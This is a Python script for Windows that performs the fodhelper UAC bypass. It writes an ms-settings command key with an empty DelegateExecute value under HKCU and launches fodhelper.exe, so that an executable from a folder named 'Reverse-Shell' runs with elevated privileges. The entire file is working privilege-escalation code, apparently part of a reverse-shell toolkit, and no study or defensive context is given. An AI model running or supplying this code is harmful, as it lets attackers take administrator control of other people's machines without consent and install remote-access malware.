import os
import subprocess
import sys
import ctypes
import winreg

CMD = r"C:\Users\User\Desktop\Reverse-Shell\service_installer\dist\service_installer.exe"
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD = "python"
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
old_value = ''


def disable_file_system_redirection():
    global old_value
    old_value = ctypes.c_long()
    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(old_value))


def enable_file_system_redirection():
    global old_value
    ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(old_value)


def is_running_as_admin():
    """
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    """
    Creates a reg key
    """
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd):
    """
    Tries to bypass the UAC
    """
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def main():
    if not is_running_as_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            disable_file_system_redirection()
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            subprocess.call(FOD_HELPER, shell=True)
            sys.exit(0)
        except Exception as e:
            print(e)
            sys.exit(1)
    else:
        print('[+] The script is running with administrative privileges!')


if __name__ == '__main__':
    main()
